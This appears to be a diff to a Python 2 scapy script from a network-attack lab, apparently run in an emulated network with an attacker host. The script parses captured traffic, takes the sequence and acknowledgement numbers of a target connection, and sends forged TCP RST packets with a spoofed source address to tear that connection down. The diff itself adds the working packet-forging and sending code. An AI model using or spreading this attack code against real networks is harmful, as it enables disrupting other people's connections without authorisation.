@@ -2,6 +2,7 @@
 
 import termcolor as T # grey red green yellow blue magenta cyan white
 import os
+import ctypes
 
 from subprocess import Popen, PIPE
 from scapy.all import *
@@ -18,15 +19,19 @@ def log(s, col="green"):
 def send_rst_packet(srcIP, srcPort, dstIP, dstPort, seqNum, ackNum):
 	log('sending RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
 
-	print srcPort
-	print dstPort
+	tcp = TCP(flags="RA")
+	tcp.dport=int(srcPort)
+	tcp.sport=int(dstPort)
+	tcp.seq=int(seqNum)
+	tcp.ack=int(ackNum)
 
-	srcPort = struct.pack('<h', int(srcPort))
-	dstPort = struct.pack('<h', int(dstPort))
+	tcp.display()
 
-	spoofed_packet = IP(dst = dstIP, src = srcIP, ttl = 1)/TCP(dport = dstPort, sport = srcPort, flags = "RA", seq = seqNum , ack = ackNum)
+	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=1)/tcp
 
-	sendp(spoofed_packet, iface="atk1-eth1")
+	send(spoofed_packet)
+
+	# TODO test if packet is received by R2
 
 
 def extract_address_port(value):
@@ -44,20 +49,26 @@ def extract_useful_data(row):
 
 	source_address_port, destination_address_port, sequence_number, acknowledge_number = None, None, None, None
 
-	source_address, source_port = extract_address_port(values[2])
+	for i, x in enumerate(values):
+		print '[', i, ']', x
 
-	if source_address == SOURCE_ADDRESS:
-		destination_address, destination_port = extract_address_port(values[4].replace(':', ''))
+	if 'ARP' not in values[1]:
+		source_address, source_port = extract_address_port(values[2])
 
-		if values[7] == 'seq':
-			sequence_number = values[8].replace(',', '').split(':')[1]
-			acknowledge_number = values[10].replace(',', '')
-		else:
-			sequence_number = values[8].replace(',', '')
+		if source_address == SOURCE_ADDRESS:
+			destination_address, destination_port = extract_address_port(values[4].replace(':', ''))
 
-		print source_address, source_port, destination_address, destination_port, sequence_number, acknowledge_number
+			if values[7] == 'seq':
+				if ':' in values[8]:
+					sequence_number = values[8].replace(',', '').split(':')[1]
+				else:
+					sequence_number = values[8].replace(',', '')
 
-		send_rst_packet(source_address, source_port, destination_address, destination_port, sequence_number, acknowledge_number)
+				acknowledge_number = values[10].replace(',', '')
+
+				print source_address, source_port, destination_address, destination_port, sequence_number, acknowledge_number
+
+				send_rst_packet(source_address, source_port, destination_address, destination_port, sequence_number, acknowledge_number)
 
 	print
 
